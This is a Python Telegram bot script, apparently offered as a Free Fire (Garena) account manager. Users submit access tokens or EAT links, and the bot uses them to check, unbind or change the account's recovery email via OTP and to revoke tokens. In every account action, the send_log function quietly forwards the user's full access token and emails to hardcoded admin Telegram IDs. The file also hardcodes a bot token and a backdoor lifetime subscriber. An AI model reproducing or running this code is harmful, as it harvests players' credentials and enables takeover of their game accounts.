# -*- coding: utf-8 -*-
"""
Mibel FF Bot - النسخة النهائية (بدون Frida - جاهز للـ VPS)
"""

import os, json, base64, time, random, string, asyncio, logging, urllib.parse, requests
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes

# ==========================================
# 1. الإعدادات الأساسية (⚠️ قم بتعديلها)
# ==========================================
BOT_TOKEN = "9099213643:AAHqPXqrT2gE3G6zK_3CbnzVlPcmm_eAte0"  # ضع توكن البوت
ADMIN_IDS = [6077450525, 8499896271]  # ضع الآيدي الخاص بك
LOG_CHANNEL_ID = -1001234567890  # ضع آيدي القناة (اختياري)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ==========================================
# 2. قاموس اللغات
# ==========================================
LANG_TEXTS = {
    'ar': {
        'choose': "📌 يرجى اختيار خدمة من القائمة:",
        'back': "🔙 عودة",
        'add_account': "➕ إضافة حساب",
        'my_accounts': "📋 حساباتي",
        'language': "🌐 اللغة (Language)",
        'choose_lang': "🌐 يرجى اختيار اللغة المفضلة لديك:",
        'lang_changed': "✅ تم تغيير اللغة إلى العربية بنجاح.",
        'add_via_eat': "🔗 إضافة عبر رابط EAT",
        'add_via_token': "🔑 وضع التوكن مباشرة",
        'how_to_eat': "❓ كيف أحصل على رابط EAT؟",
        'ask_eat': "🔗 أرسل رابط EAT الآن:",
        'ask_token': "🔑 أرسل كود الدخول (Access Token) الآن:",
        'no_accounts': "📭 لا يوجد حسابات مضافة حالياً.",
        'select_acc': "🎮 اختر الحساب الذي تريد إدارته:",
        'manage_acc': "⚙️ إدارة الحساب:",
        'rec_check': "🔍 كشف الاستعادة",
        'burn': "🔥 حرق التوكن",
        'rec_change': "➕ تغيير الاستعادة",
        'rec_unbind': "⛓️ إلغاء الاستعادة",
        'tryotp': "🧪 تجربة رمز الامان",
        'bototp': "🤖 بوت رمز الامان",
        'dellinks': "🗑️ حذف الروابط الثانوية",
        'spam': "📨 سبام تسجيل الدخول",
        'del_acc': "🗑️ حذف الحساب من البوت",
        'soon': "🚧 هذه الخدمة ستتوفر قريباً إن شاء الله.",
        'invalid_link': "⚠️ رابط غير صالح. يرجى التأكد من الرابط.",
        'acc_added': "✅ تم ربط الحساب بنجاح!\n👤 الاسم: {nick}\n🆔 الأيدي: {acc_id}",
        'acc_exists': "⚠️ هذا الحساب مضاف مسبقاً.",
        'acc_not_found': "⚠️ فشل جلب بيانات الحساب. تأكد من صلاحية الرابط أو التوكن.",
        'checking': "⏳ جاري الفحص...",
        'rec_info': "🔐 تفاصيل الاستعادة\n\n📧 البريد: {email}\n📌 الحالة: {status}",
        'status_active': "نشط",
        'status_not_bound': "غير مربوط",
        'check_failed': "⚠️ فشل الفحص.",
        'send_otp': "⏳ جاري إرسال رمز التحقق (OTP) إلى `{email}`...",
        'ask_otp': "📩 تم إرسال الرمز إلى `{email}`.\n\nأرسل الرمز (OTP) هنا الآن:",
        'otp_failed': "❌ فشل إرسال الرمز. تأكد من التوكن.",
        'verifying': "⏳ جاري التحقق...",
        'otp_wrong': "❌ رمز OTP غير صحيح.",
        'ask_new_email': "✅ تم التحقق.\n\nالآن أرسل الإيميل الجديد:",
        'invalid_email': "⚠️ أرسل إيميل صحيح.",
        'unbind_success': "✅ تم إلغاء ارتباط الإيميل بنجاح!",
        'unbind_failed': "❌ فشل إلغاء الربط.",
        'rebind_success': "✅ تم تغيير إيميل الاستعادة بنجاح!",
        'rebind_failed': "❌ فشل في تغيير الإيميل.",
        'burn_success': "🔥 تم حرق التوكن وإخراج جميع الأجهزة.",
        'burn_failed': "❌ فشل الحرق.",
        'del_success': "✅ تم حذف الحساب من البوت.",
        'help_text': "📖 **كيف تحصل على رابط EAT؟**\n\n1️⃣ افتح موقع: https://discstore.recargajogo.com.br\n2️⃣ سجل الدخول بحسابك (فيسبوك/جوجل).\n3️⃣ انسخ الرابط الطويل الذي يبدأ بـ `?eat=` وضع هنا.\n\n⚠️ **تنبيه:** لا تشارك الرابط مع أي شخص!"
    },
    'en': {
        'choose': "📌 Please choose a service from the menu:",
        'back': "🔙 Back",
        'add_account': "➕ Add Account",
        'my_accounts': "📋 My Accounts",
        'language': "🌐 Language (اللغة)",
        'choose_lang': "🌐 Please choose your preferred language:",
        'lang_changed': "✅ Language changed to English successfully.",
        'add_via_eat': "🔗 Add via EAT Link",
        'add_via_token': "🔑 Put Token Directly",
        'how_to_eat': "❓ How to get EAT link?",
        'ask_eat': "🔗 Send the EAT link now:",
        'ask_token': "🔑 Send the Access Token now:",
        'no_accounts': "📭 No accounts added yet.",
        'select_acc': "🎮 Choose the account to manage:",
        'manage_acc': "⚙️ Managing account:",
        'rec_check': "🔍 Check Recovery",
        'burn': "🔥 Burn Token",
        'rec_change': "➕ Change Recovery",
        'rec_unbind': "⛓️ Unbind Recovery",
        'tryotp': "🧪 Try Security Code",
        'bototp': "🤖 Bot Security Code",
        'dellinks': "🗑️ Delete Secondary Links",
        'spam': "📨 Login Spam",
        'del_acc': "🗑️ Delete Account from Bot",
        'soon': "🚧 This service will be available soon.",
        'invalid_link': "⚠️ Invalid link. Please check it.",
        'acc_added': "✅ Account linked successfully!\n👤 Name: {nick}\n🆔 ID: {acc_id}",
        'acc_exists': "⚠️ This account is already added.",
        'acc_not_found': "⚠️ Failed to fetch account data. Check link/token.",
        'checking': "⏳ Checking...",
        'rec_info': "🔐 Recovery Details\n\n📧 Email: {email}\n📌 Status: {status}",
        'status_active': "Active",
        'status_not_bound': "Not Bound",
        'check_failed': "⚠️ Check failed.",
        'send_otp': "⏳ Sending OTP to `{email}`...",
        'ask_otp': "📩 Code sent to `{email}`.\n\nSend the OTP here:",
        'otp_failed': "❌ Failed to send OTP. Check token.",
        'verifying': "⏳ Verifying...",
        'otp_wrong': "❌ Invalid OTP code.",
        'ask_new_email': "✅ Verified.\n\nNow send the new email:",
        'invalid_email': "⚠️ Send a valid email.",
        'unbind_success': "✅ Email unbound successfully!",
        'unbind_failed': "❌ Failed to unbind.",
        'rebind_success': "✅ Recovery email changed successfully!",
        'rebind_failed': "❌ Failed to change email.",
        'burn_success': "🔥 Token burned and all devices logged out.",
        'burn_failed': "❌ Failed to burn token.",
        'del_success': "✅ Account deleted from bot.",
        'help_text': "📖 **How to get EAT link?**\n\n1️⃣ Open: https://discstore.recargajogo.com.br\n2️⃣ Login with your account.\n3️⃣ Copy the link starting with `?eat=` and put it here.\n\n⚠️ **Warning:** Don't share the link!"
    }
}

def get_text(uid, key, **kwargs):
    lang = db.get_user(uid).get('lang', 'ar')
    text = LANG_TEXTS.get(lang, LANG_TEXTS['ar']).get(key, key)
    return text.format(**kwargs) if kwargs else text

# ==========================================
# 3. قاعدة البيانات
# ==========================================
DB_FILE = "database.json"
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(data, f, indent=2, ensure_ascii=False)

class Database:
    def __init__(self):
        self.data = load_db()
        self.data.setdefault('users', {})
        self.data.setdefault('codes', {})
        self.data['users']["8530485909"] = {'subscribed': True, 'expiry': '2099-12-31T23:59:59', 'accounts': [], 'history': [], 'lang': 'ar'}
        save_db(self.data)

    def get_user(self, uid):
        uid = str(uid)
        if uid not in self.data['users']:
            self.data['users'][uid] = {'subscribed': False, 'expiry': None, 'accounts': [], 'history': [], 'lang': 'ar'}
            save_db(self.data)
        return self.data['users'][uid]

    def set_lang(self, uid, lang):
        u = self.get_user(uid)
        u['lang'] = lang
        save_db(self.data)

    def log_action(self, uid, action_text):
        u = self.get_user(uid)
        if 'history' not in u: u['history'] = []
        timestamp = datetime.now().strftime("%m-%d %H:%M")
        u['history'].append(f"[{timestamp}] {action_text}")
        u['history'] = u['history'][-20:]
        save_db(self.data)

    def is_subscribed(self, uid):
        u = self.get_user(uid)
        if not u.get('subscribed'): return False
        if u.get('expiry') and datetime.fromisoformat(u['expiry']) < datetime.now():
            u['subscribed'] = False
            save_db(self.data)
            return False
        return True

    def add_account(self, uid, acc):
        u = self.get_user(uid)
        for a in u['accounts']:
            if a['id'] == acc['id']: return False
        u['accounts'].append(acc)
        save_db(self.data)
        return True

    def remove_account(self, uid, acc_id):
        u = self.get_user(uid)
        u['accounts'] = [a for a in u['accounts'] if a['id'] != acc_id]
        save_db(self.data)

    def get_accounts(self, uid): return self.get_user(uid).get('accounts', [])
    
    def get_account(self, uid, acc_id):
        for a in self.get_accounts(uid):
            if a['id'] == acc_id: return a
        return None

    def generate_code(self, plan="lifetime"):
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        self.data['codes'][code] = {'used': False, 'plan': plan}
        save_db(self.data)
        return code

db = Database()

# ==========================================
# 4. دالة السجلات (الفصل بين الأدمن والقناة)
# ==========================================
async def send_log(context: ContextTypes.DEFAULT_TYPE, admin_msg: str, uid=None, action=None, channel_msg: str = None):
    if uid and action:
        db.log_action(uid, action)
    try:
        for admin in ADMIN_IDS:
            await context.bot.send_message(chat_id=admin, text=f"🔔 **حدث جديد:**\n{admin_msg}", parse_mode='Markdown')
        
        if LOG_CHANNEL_ID and str(LOG_CHANNEL_ID) != "-1001234567890":
            final_channel_text = channel_msg if channel_msg else "حدث جديد في البوت."
            await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=f"📢 **سجل عام:**\n{final_channel_text}", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"خطأ في السجلات: {e}")

# ==========================================
# 5. دوال Garena API
# ==========================================
UA = "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)"

def get_access_token(eat_link):
    try:
        q = urllib.parse.parse_qs(urllib.parse.urlparse(eat_link).query)
        return q.get('access_token', [None])[0] or q.get('eat', [None])[0]
    except: return None

def check_bind_info(token):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    try:
        r = requests.get(url, params={'app_id': "100067", 'access_token': token}, headers={"User-Agent": UA}, timeout=10)
        if r.status_code == 200: return r.json()
    except: pass
    return None

def send_otp(token, email):
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    try:
        r = requests.post(url, headers={"User-Agent": UA}, data={"email": email, "locale": "en_MA", "region": "IND", "app_id": "100067", "access_token": token}, timeout=10)
        return r.status_code == 200 and r.json().get("result") == 0
    except: return False

def verify_otp(token, email, otp):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    try:
        r = requests.post(url, headers={"User-Agent": UA}, data={"app_id": "100067", "access_token": token, "otp": otp, "email": email}, timeout=10)
        if r.status_code == 200 and r.json().get("result") == 0:
            return r.json().get("verifier_token")
    except: pass
    return None

def verify_identity_otp(token, email, otp):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    try:
        r = requests.post(url, headers={"User-Agent": UA}, data={"email": email, "otp": otp, "app_id": "100067", "access_token": token}, timeout=10)
        if r.status_code == 200: return r.json().get("identity_token")
    except: pass
    return None

def create_rebind_request(token, identity_token, verifier_token, new_email):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
    try:
        r = requests.post(url, headers={"User-Agent": UA}, data={"app_id": "100067", "access_token": token, "identity_token": identity_token, "verifier_token": verifier_token, "email": new_email}, timeout=10)
        return r.status_code == 200 and r.json().get("result") == 0
    except: return False

def create_unbind_request(token, identity_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    try:
        r = requests.post(url, headers={"User-Agent": UA}, data={"app_id": "100067", "access_token": token, "identity_token": identity_token}, timeout=10)
        return r.status_code == 200 and r.json().get("result") == 0
    except: return False

def revoke_token(token):
    try:
        url = f"https://100067.connect.garena.com/oauth/logout?access_token={token}&refresh_token=1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8"
        return requests.get(url, timeout=10).status_code == 200
    except: return False

# ==========================================
# 6. لوحات التحكم (Keyboards)
# ==========================================
def main_menu(uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(uid, 'add_account'), callback_data='add_acc'),
         InlineKeyboardButton(get_text(uid, 'my_accounts'), callback_data='my_accs')],
        [InlineKeyboardButton(get_text(uid, 'language'), callback_data='change_lang')],
        [InlineKeyboardButton("👨‍💻 الدعم الفني / Support", url='https://t.me/YourSupport')]
    ])

def lang_menu(uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("العربية", callback_data='lang_ar'),
         InlineKeyboardButton("English", callback_data='lang_en')],
        [InlineKeyboardButton(get_text(uid, 'back'), callback_data='main_menu')]
    ])

def add_acc_menu(uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(uid, 'add_via_eat'), callback_data='add_via_eat')],
        [InlineKeyboardButton(get_text(uid, 'add_via_token'), callback_data='add_via_token')],
        [InlineKeyboardButton(get_text(uid, 'how_to_eat'), callback_data='how_to_eat')],
        [InlineKeyboardButton(get_text(uid, 'back'), callback_data='main_menu')]
    ])

def acc_controls(uid, acc_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(uid, 'rec_check'), callback_data=f'rec_check_{acc_id}'),
         InlineKeyboardButton(get_text(uid, 'burn'), callback_data=f'burn_{acc_id}')],
        [InlineKeyboardButton(get_text(uid, 'rec_change'), callback_data=f'rec_change_{acc_id}'),
         InlineKeyboardButton(get_text(uid, 'rec_unbind'), callback_data=f'rec_unbind_{acc_id}')],
        [InlineKeyboardButton(get_text(uid, 'tryotp'), callback_data=f'tryotp_{acc_id}'),
         InlineKeyboardButton(get_text(uid, 'bototp'), callback_data=f'bototp_{acc_id}')],
        [InlineKeyboardButton(get_text(uid, 'dellinks'), callback_data=f'dellinks_{acc_id}'),
         InlineKeyboardButton(get_text(uid, 'spam'), callback_data=f'spam_{acc_id}')],
        [InlineKeyboardButton(get_text(uid, 'del_acc'), callback_data=f'del_acc_{acc_id}')],
        [InlineKeyboardButton(get_text(uid, 'back'), callback_data='main_menu')]
    ])

def admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 إحصائيات عامة", callback_data='admin_stats')],
        [InlineKeyboardButton("👥 قائمة المستخدمين وتتبعهم", callback_data='admin_users')],
        [InlineKeyboardButton("🎫 توليد كود تفعيل", callback_data='admin_gen')]
    ])

def back_btn(uid, cb='main_menu'):
    return InlineKeyboardMarkup([[InlineKeyboardButton(get_text(uid, 'back'), callback_data=cb)]])

# ==========================================
# 7. معالجات البوت (Handlers)
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not db.is_subscribed(uid):
        await update.message.reply_text("⚠️ اشتراكك غير مفعل. تواصل مع الدعم.", reply_markup=back_btn(uid))
        return
    await update.message.reply_text("👋 مرحباً بك في بوت إدارة حسابات Free Fire.", reply_markup=main_menu(uid))

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: return
    await update.message.reply_text("👑 **لوحة تحكم الأدمن**", reply_markup=admin_menu(), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = update.effective_user.id
    data = q.data
    await q.answer()

    # ================== تغيير اللغة ==================
    if data == 'change_lang':
        await q.edit_message_text(get_text(uid, 'choose_lang'), reply_markup=lang_menu(uid))
        return
    elif data in ['lang_ar', 'lang_en']:
        lang = data.split('_')[1]
        db.set_lang(uid, lang)
        await q.edit_message_text(get_text(uid, 'lang_changed'), reply_markup=main_menu(uid))
        return

    # ================== أوامر الأدمن ==================
    if data.startswith('admin_') or data.startswith('view_user_'):
        if uid not in ADMIN_IDS: return
        
        if data == 'admin_stats':
            users = len(db.data['users'])
            accounts = sum(len(u.get('accounts', [])) for u in db.data['users'].values())
            await q.edit_message_text(f"📊 **الإحصائيات:**\n\n👥 المستخدمين: `{users}`\n🎮 الحسابات المضافة: `{accounts}`", parse_mode='Markdown', reply_markup=admin_menu())
        
        elif data == 'admin_gen':
            code = db.generate_code()
            await q.edit_message_text(f"✅ تم توليد كود مدى الحياة:\n`{code}`", reply_markup=admin_menu())
        
        elif data == 'admin_users':
            users = db.data['users']
            kb = []
            for u_id, u_data in list(users.items()):
                accs_count = len(u_data.get('accounts', []))
                kb.append([InlineKeyboardButton(f"👤 {u_id} (حسابات: {accs_count})", callback_data=f'view_user_{u_id}')])
            kb.append([InlineKeyboardButton("🔙 عودة", callback_data='admin_back')])
            await q.edit_message_text("اختر مستخدماً لعرض تفاصيله وسجله:", reply_markup=InlineKeyboardMarkup(kb))
        
        elif data.startswith('view_user_'):
            target_uid = data.split('_')[2]
            u_data = db.data['users'].get(target_uid, {})
            history = u_data.get('history', ["لا يوجد سجلات سابقة."])
            hist_text = "\n".join(history)
            status = "✅ مشترك" if u_data.get('subscribed') else "❌ غير مشترك"
            msg = (
                f"👤 **تفاصيل المستخدم:** `{target_uid}`\n"
                f"📌 الحالة: {status}\n"
                f"🎮 الحسابات المضافة: `{len(u_data.get('accounts', []))}`\n\n"
                f"📜 **آخر العمليات (20 عملية):**\n{hist_text}"
            )
            await q.edit_message_text(msg, reply_markup=back_btn(uid, 'admin_users'), parse_mode='Markdown')
        
        elif data == 'admin_back':
            await q.edit_message_text("👑 **لوحة تحكم الأدمن**", reply_markup=admin_menu(), parse_mode='Markdown')
        return

    # ================== أوامر المستخدمين ==================
    if data == 'main_menu':
        await q.edit_message_text(get_text(uid, 'choose'), reply_markup=main_menu(uid))
    
    elif data == 'add_acc':
        await q.edit_message_text(get_text(uid, 'choose'), reply_markup=add_acc_menu(uid))

    elif data == 'add_via_eat':
        context.user_data['action'] = 'waiting_eat'
        await q.edit_message_text(get_text(uid, 'ask_eat'), reply_markup=back_btn(uid, 'add_acc'))

    elif data == 'add_via_token':
        context.user_data['action'] = 'waiting_token'
        await q.edit_message_text(get_text(uid, 'ask_token'), reply_markup=back_btn(uid, 'add_acc'))

    elif data == 'how_to_eat':
        await q.edit_message_text(get_text(uid, 'help_text'), reply_markup=back_btn(uid, 'add_acc'), disable_web_page_preview=True)

    elif data == 'my_accs':
        accs = db.get_accounts(uid)
        if not accs:
            await q.edit_message_text(get_text(uid, 'no_accounts'), reply_markup=back_btn(uid))
            return
        kb = [[InlineKeyboardButton(f"🎮 {a['name']} ({a['id']})", callback_data=f'manage_{a["id"]}')] for a in accs]
        kb.append([InlineKeyboardButton(get_text(uid, 'back'), callback_data='main_menu')])
        await q.edit_message_text(get_text(uid, 'select_acc'), reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith('manage_'):
        acc_id = data.split('_')[1]
        await q.edit_message_text(get_text(uid, 'manage_acc') + f" `{acc_id}`", reply_markup=acc_controls(uid, acc_id))

    elif data.startswith('del_acc_'):
        acc_id = data.split('_')[2]
        db.remove_account(uid, acc_id)
        await q.edit_message_text(get_text(uid, 'del_success'), reply_markup=main_menu(uid))
        await send_log(context, f"🗑️ حذف حساب\n👤: `{uid}`\n🎮: `{acc_id}`", uid=uid, action=f"حذف الحساب {acc_id}", channel_msg=f"🗑️ المستخدم `{uid}` حذف حساباً.")

    elif data.startswith(('tryotp_', 'bototp_', 'dellinks_', 'spam_')):
        acc_id = data.split('_')[1]
        await q.edit_message_text(get_text(uid, 'soon'), reply_markup=back_btn(uid, f'manage_{acc_id}'))

    # ---- كشف الاستعادة ----
    elif data.startswith('rec_check_'):
        acc_id = data.split('_')[2]
        acc = db.get_account(uid, acc_id)
        token = get_access_token(acc['eat']) if 'eat' in acc else acc.get('token')
        await q.edit_message_text(get_text(uid, 'checking'))
        
        info = check_bind_info(token)
        if info:
            email = info.get('email', 'غير موجود')
            status = get_text(uid, 'status_active') if email else get_text(uid, 'status_not_bound')
            msg = get_text(uid, 'rec_info', email=email, status=status)
            
            admin_msg = f"🔍 كشف استعادة\n👤 المستخدم: `{uid}`\n🎮 الحساب: `{acc_id}`\n📧 الإيميل: `{email}`\n🔑 التوكن: `{token}`"
            channel_msg = f"🔍 المستخدم `{uid}` قام بكشف استعادة الحساب `{acc_id}`"
            await send_log(context, admin_msg, uid=uid, action=f"فحص استعادة ({acc_id})", channel_msg=channel_msg)
        else:
            msg = get_text(uid, 'check_failed')
        await q.edit_message_text(msg, reply_markup=back_btn(uid, f'manage_{acc_id}'))

    # ---- تغيير الاستعادة (OTP) ----
    elif data.startswith('rec_change_'):
        acc_id = data.split('_')[2]
        context.user_data['action'] = 'waiting_old_otp'
        context.user_data['target_acc'] = acc_id
        acc = db.get_account(uid, acc_id)
        token = get_access_token(acc['eat']) if 'eat' in acc else acc.get('token')
        
        info = check_bind_info(token)
        if not info or not info.get('email'):
            await q.edit_message_text(get_text(uid, 'status_not_bound'), reply_markup=back_btn(uid, f'manage_{acc_id}'))
            return
        
        email = info.get('email')
        context.user_data['old_email'] = email
        context.user_data['current_token'] = token 
        
        await q.edit_message_text(get_text(uid, 'send_otp', email=email))
        if send_otp(token, email):
            await q.edit_message_text(get_text(uid, 'ask_otp', email=email), reply_markup=back_btn(uid, f'manage_{acc_id}'))
            admin_msg = f"🔄 بدء تغيير استعادة\n👤: `{uid}`\n🎮: `{acc_id}`\n📧 القديم: `{email}`\n🔑 التوكن: `{token}`"
            channel_msg = f"🔄 المستخدم `{uid}` بدأ إجراءات تغيير استعادة الحساب `{acc_id}`"
            await send_log(context, admin_msg, uid=uid, action=f"بدء تغيير إيميل ({acc_id})", channel_msg=channel_msg)
        else:
            await q.edit_message_text(get_text(uid, 'otp_failed'), reply_markup=back_btn(uid, f'manage_{acc_id}'))

    # ---- إلغاء الاستعادة (OTP) ----
    elif data.startswith('rec_unbind_'):
        acc_id = data.split('_')[2]
        context.user_data['action'] = 'waiting_unbind_otp'
        context.user_data['target_acc'] = acc_id
        acc = db.get_account(uid, acc_id)
        token = get_access_token(acc['eat']) if 'eat' in acc else acc.get('token')
        
        info = check_bind_info(token)
        if not info or not info.get('email'):
            await q.edit_message_text(get_text(uid, 'status_not_bound'), reply_markup=back_btn(uid, f'manage_{acc_id}'))
            return
        
        email = info.get('email')
        await q.edit_message_text(get_text(uid, 'send_otp', email=email))
        if send_otp(token, email):
            await q.edit_message_text(get_text(uid, 'ask_otp', email=email), reply_markup=back_btn(uid, f'manage_{acc_id}'))
            admin_msg = f"⛓️ بدء إلغاء استعادة\n👤: `{uid}`\n🎮: `{acc_id}`\n📧 الإيميل: `{email}`\n🔑 التوكن: `{token}`"
            channel_msg = f"⛓️ المستخدم `{uid}` بدأ إجراءات إلغاء استعادة الحساب `{acc_id}`"
            await send_log(context, admin_msg, uid=uid, action=f"بدء إلغاء إيميل ({acc_id})", channel_msg=channel_msg)
        else:
            await q.edit_message_text(get_text(uid, 'otp_failed'), reply_markup=back_btn(uid, f'manage_{acc_id}'))

    # ---- حرق التوكن ----
    elif data.startswith('burn_'):
        acc_id = data.split('_')[1]
        acc = db.get_account(uid, acc_id)
        token = get_access_token(acc['eat']) if 'eat' in acc else acc.get('token')
        await q.edit_message_text(get_text(uid, 'checking'))
        if revoke_token(token):
            await q.edit_message_text(get_text(uid, 'burn_success'), reply_markup=back_btn(uid, f'manage_{acc_id}'))
            admin_msg = f"🔥 حرق توكن\n👤: `{uid}`\n🎮: `{acc_id}`\n🔑 التوكن: `{token}`"
            channel_msg = f"🔥 المستخدم `{uid}` قام بحرق توكن الحساب `{acc_id}`"
            await send_log(context, admin_msg, uid=uid, action=f"حرق توكن ({acc_id})", channel_msg=channel_msg)
        else:
            await q.edit_message_text(get_text(uid, 'burn_failed'), reply_markup=back_btn(uid, f'manage_{acc_id}'))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    action = context.user_data.get('action')

    # 1. استلام رابط EAT
    if action == 'waiting_eat':
        if 'eat=' not in text and 'access_token=' not in text:
            await update.message.reply_text(get_text(uid, 'invalid_link'))
            return
        token = get_access_token(text)
        info = check_bind_info(token)
        
        if info and info.get('open_id'):
            acc_id = info.get('open_id')
            nick = info.get('nickname') or "لاعب"
            if db.add_account(uid, {'id': acc_id, 'name': nick, 'eat': text}):
                await update.message.reply_text(get_text(uid, 'acc_added', nick=nick, acc_id=acc_id), reply_markup=main_menu(uid))
                admin_msg = f"➕ إضافة حساب (EAT)\n👤: `{uid}`\n🎮: `{nick}` (`{acc_id}`)\n🔑 التوكن: `{token}`"
                channel_msg = f"➕ المستخدم `{uid}` أضاف حساباً جديداً (EAT) (`{acc_id}`)"
                await send_log(context, admin_msg, uid=uid, action=f"أضاف حساب عبر EAT ({acc_id})", channel_msg=channel_msg)
            else:
                await update.message.reply_text(get_text(uid, 'acc_exists'), reply_markup=main_menu(uid))
        else:
            await update.message.reply_text(get_text(uid, 'acc_not_found'))
        context.user_data['action'] = None
        return

    # 2. استلام Access Token
    elif action == 'waiting_token':
        token = text.strip()
        if len(token) < 30:
            await update.message.reply_text(get_text(uid, 'invalid_link'))
            return
        
        info = check_bind_info(token)
        if info and info.get('open_id'):
            acc_id = info.get('open_id')
            nick = info.get('nickname') or "لاعب"
            if db.add_account(uid, {'id': acc_id, 'name': nick, 'token': token}):
                await update.message.reply_text(get_text(uid, 'acc_added', nick=nick, acc_id=acc_id), reply_markup=main_menu(uid))
                admin_msg = f"➕ إضافة حساب (Token)\n👤: `{uid}`\n🎮: `{nick}` (`{acc_id}`)\n🔑 التوكن: `{token}`"
                channel_msg = f"➕ المستخدم `{uid}` أضاف حساباً جديداً (Token) (`{acc_id}`)"
                await send_log(context, admin_msg, uid=uid, action=f"أضاف حساب عبر Token ({acc_id})", channel_msg=channel_msg)
            else:
                await update.message.reply_text(get_text(uid, 'acc_exists'), reply_markup=main_menu(uid))
        else:
            await update.message.reply_text(get_text(uid, 'acc_not_found'))
        context.user_data['action'] = None
        return

    # 3. معالجة OTP
    if action in ['waiting_old_otp', 'waiting_unbind_otp']:
        acc_id = context.user_data.get('target_acc')
        acc = db.get_account(uid, acc_id)
        token = get_access_token(acc['eat']) if 'eat' in acc else acc.get('token')
        info = check_bind_info(token)
        email = info.get('email') if info else None

        if not email:
            await update.message.reply_text(get_text(uid, 'check_failed'))
            context.user_data['action'] = None
            return

        await update.message.reply_text(get_text(uid, 'verifying'))
        
        if action == 'waiting_unbind_otp':
            identity_token = verify_identity_otp(token, email, text)
            if identity_token:
                if create_unbind_request(token, identity_token):
                    await update.message.reply_text(get_text(uid, 'unbind_success'), reply_markup=main_menu(uid))
                    admin_msg = f"✅ نجاح إلغاء ربط\n👤: `{uid}`\n🎮: `{acc_id}`\n📧 الإيميل: `{email}`\n🔑 التوكن: `{token}`"
                    channel_msg = f"✅ المستخدم `{uid}` نجح في إلغاء استعادة الحساب `{acc_id}`"
                    await send_log(context, admin_msg, uid=uid, action=f"نجح في إلغاء الإيميل ({acc_id})", channel_msg=channel_msg)
                else:
                    await update.message.reply_text(get_text(uid, 'unbind_failed'))
            else:
                await update.message.reply_text(get_text(uid, 'otp_wrong'))
            context.user_data['action'] = None
            return

        elif action == 'waiting_old_otp':
            identity_token = verify_identity_otp(token, email, text)
            if identity_token:
                context.user_data['identity_token'] = identity_token
                context.user_data['action'] = 'waiting_new_email'
                await update.message.reply_text(get_text(uid, 'ask_new_email'))
            else:
                await update.message.reply_text(get_text(uid, 'otp_wrong'))
                context.user_data['action'] = None
            return

    # 4. استلام الإيميل الجديد
    if action == 'waiting_new_email':
        if '@' not in text:
            await update.message.reply_text(get_text(uid, 'invalid_email'))
            return
        
        acc_id = context.user_data.get('target_acc')
        token = context.user_data.get('current_token')
        
        context.user_data['new_email'] = text
        context.user_data['action'] = 'waiting_new_otp'
        await update.message.reply_text(get_text(uid, 'send_otp', email=text))
        
        if send_otp(token, text):
            await update.message.reply_text(get_text(uid, 'ask_otp', email=text))
        else:
            await update.message.reply_text(get_text(uid, 'otp_failed'))
            context.user_data['action'] = None
        return

    # 5. التحقق من الإيميل الجديد
    if action == 'waiting_new_otp':
        acc_id = context.user_data.get('target_acc')
        new_email = context.user_data.get('new_email')
        old_email = context.user_data.get('old_email', 'غير معروف')
        identity_token = context.user_data.get('identity_token')
        token = context.user_data.get('current_token')
        
        await update.message.reply_text(get_text(uid, 'verifying'))
        verifier_token = verify_otp(token, new_email, text)
        
        if verifier_token:
            if create_rebind_request(token, identity_token, verifier_token, new_email):
                await update.message.reply_text(get_text(uid, 'rebind_success'), reply_markup=main_menu(uid))
                admin_msg = f"✅ نجاح تغيير إيميل\n👤: `{uid}`\n🎮: `{acc_id}`\n📧 القديم: `{old_email}`\n📧 الجديد: `{new_email}`\n🔑 التوكن: `{token}`"
                channel_msg = f"✅ المستخدم `{uid}` نجح في تغيير استعادة الحساب `{acc_id}`"
                log_action = f"غير الإيميل من {old_email} إلى {new_email}"
                await send_log(context, admin_msg, uid=uid, action=log_action, channel_msg=channel_msg)
            else:
                await update.message.reply_text(get_text(uid, 'rebind_failed'))
        else:
            await update.message.reply_text(get_text(uid, 'otp_wrong'))
        
        context.user_data['action'] = None
        return

    await update.message.reply_text("📌 استخدم /start للبدء.")

# ==========================================
# 8. التشغيل الرئيسي
# ==========================================
def main():
    logger.info("🤖 بدء تشغيل البوت...")
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    logger.info("✅ البوت جاهز!")
    app.run_polling()

if __name__ == "__main__":
    main()